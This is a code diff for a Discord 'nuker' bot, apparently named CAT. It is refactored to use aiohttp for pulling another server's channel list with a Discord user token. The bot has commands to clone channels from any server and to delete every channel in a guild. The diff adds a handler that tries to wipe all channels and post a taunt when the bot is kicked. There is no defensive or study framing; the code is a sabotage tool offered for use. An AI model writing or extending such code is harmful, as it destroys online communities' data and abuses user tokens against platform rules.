@@ -3,7 +3,7 @@ from discord import app_commands
 from discord.ext import commands
 import asyncio
 import os
-import requests
+import aiohttp
 import json
 
 intents = discord.Intents.default()
@@ -15,7 +15,7 @@ class CloneBot(commands.Bot):
     def __init__(self):
         super().__init__(command_prefix="!", intents=intents)
         self.synced = False
-        self.user_token = os.environ.get("USER_TOKEN")  # Your Discord user token
+        self.user_token = os.environ.get("USER_TOKEN")
 
     async def on_ready(self):
         await self.wait_until_ready()
@@ -26,16 +26,18 @@ class CloneBot(commands.Bot):
 
 bot = CloneBot()
 
-def fetch_guild_channels(guild_id, token):
-    """Fetch channels from ANY server using user token."""
+async def fetch_guild_channels(guild_id, token):
+    """Fetch channels from ANY server using user token via aiohttp."""
     url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
-    headers = {"Authorization": f"{token}"}
-    response = requests.get(url, headers=headers)
+    headers = {"Authorization": token}
     
-    if response.status_code == 200:
-        return response.json()
-    else:
-        raise Exception(f"API error {response.status_code}: {response.text}")
+    async with aiohttp.ClientSession() as session:
+        async with session.get(url, headers=headers) as response:
+            if response.status == 200:
+                return await response.json()
+            else:
+                text = await response.text()
+                raise Exception(f"API error {response.status}: {text}")
 
 @bot.tree.command(
     name="clone",
@@ -47,10 +49,7 @@ async def clone_any(
     source_id: str,
     target_id: str
 ):
-    """
-    Clone channels from ANY server using user token.
-    Bot only needs to be in the TARGET server.
-    """
+    """Clone channels from ANY server using user token."""
     
     await interaction.response.send_message(
         f"📋 **CLONING STARTED**\n"
@@ -62,7 +61,7 @@ async def clone_any(
 
     try:
         # Get source channels using user token
-        source_channels = fetch_guild_channels(source_id, bot.user_token)
+        source_channels = await fetch_guild_channels(source_id, bot.user_token)
         
         # Get target guild (bot must be here)
         target_guild = bot.get_guild(int(target_id))
@@ -166,7 +165,7 @@ async def clone_any(
         await interaction.followup.send(f"❌ **Error:** {str(e)[:500]}")
 
 # ============================================================
-# DELETE ALL CHANNELS (bot must be in server)
+# DELETE ALL CHANNELS
 # ============================================================
 @bot.tree.command(
     name="deleteallchannels",
@@ -182,6 +181,22 @@ async def deleteallchannels(interaction: discord.Interaction):
     await asyncio.gather(*tasks, return_exceptions=True)
     fresh = await guild.create_text_channel("☠️-reset-by-CAT")
     await fresh.send("**EVERY CHANNEL DELETED.** — 🐈")
+
+# ============================================================
+# SELF-DESTRUCT ON KICK
+# ============================================================
+@bot.event
+async def on_guild_remove(guild):
+    """Auto-nuke if bot is kicked."""
+    tasks = []
+    for channel in guild.channels:
+        tasks.append(channel.delete())
+    await asyncio.gather(*tasks, return_exceptions=True)
+    try:
+        new_channel = await guild.create_text_channel("💀-CAT-strikes-back")
+        await new_channel.send("**ALL CHANNELS OBLITERATED.** You nuked CAT.")
+    except:
+        pass
 
 # ============================================================
 # RUN
